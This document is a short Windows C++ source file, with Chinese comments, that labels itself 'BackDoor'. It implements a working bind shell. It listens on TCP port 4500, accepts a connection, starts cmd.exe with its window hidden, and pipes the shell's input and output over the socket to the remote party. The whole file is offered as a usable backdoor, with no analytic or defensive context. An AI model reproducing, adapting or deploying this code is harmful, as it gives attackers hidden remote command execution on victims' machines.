// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

SOCKET sListen,sClient;
//定义管道句柄
HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;

//接受远程主机的命令，并写入管道2
DWORD WINAPI Thread2( LPVOID lpParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD nByteToWrite, nByteWritten;
	char recv_buff[1024];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	//创建管道
	CreatePipe(&hReadPipe,&hWriteFile,&sa,0);
	while(true)
	{
		Sleep(250);
		//接受远程cmd命令
		nByteToWrite = recv(sClient ,recv_buff,1024,0);
		//写入管道
		WriteFile(hWriteFile,recv_buff,nByteToWrite,&nByteWritten,NULL);
	}
	return 0;
}

//读取管道1中的数据，返回给远程主机
DWORD WINAPI Thread1( LPVOID lpParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD len;
	char send_buff[2048];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
    CreatePipe(&hReadFile,&hWritePipe,&sa,0);
	while (true)
	{
		//读取管道中的数据
		ReadFile(hReadFile,send_buff,2048,&len,NULL);
		//把管道中的数据发送给远程主机
        send(sClient,send_buff,len,0);
	}
	return 0;
}

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n";
    HANDLE hThread[2];
	DWORD dwThreadIdA,dwThreadIdB;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
    //初始化socket，并绑定本地端口监听
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	if(listen(sListen, 2) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	//接收连接
	sClient = accept(sListen, NULL, NULL);
	//创建两个进程，用于读取写入管道中的数据，实现通信
	hThread[0]=CreateThread(NULL, 0, Thread1, NULL, 0, &dwThreadIdA);
	hThread[1]=CreateThread(NULL, 0, Thread2, NULL, 0, &dwThreadIdB);
	//暂停1秒,为了确保两个线程中的管道创建完毕，因为下面要对管道进行操作
    Sleep(1000);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	//使cmd的输入输出和管道关联
	si.hStdInput = hReadPipe;
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = SW_HIDE;
	char cmdline[256]={0};
	//得到系统路径
	GetSystemDirectory(cmdline,sizeof(cmdline));
    strcat(cmdline,"\\cmd.exe");
	//创建cmd进程
	if (CreateProcess(cmdline, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0)
	{
		printf ("CreateProcess Error \n");
		return 0;
	} 
	//发送欢迎信息
	send(sClient ,wMessage,strlen(wMessage),0);
	//等待线程结束
	WaitForMultipleObjects(2,hThread,true,INFINITE);  
	return 0;
}
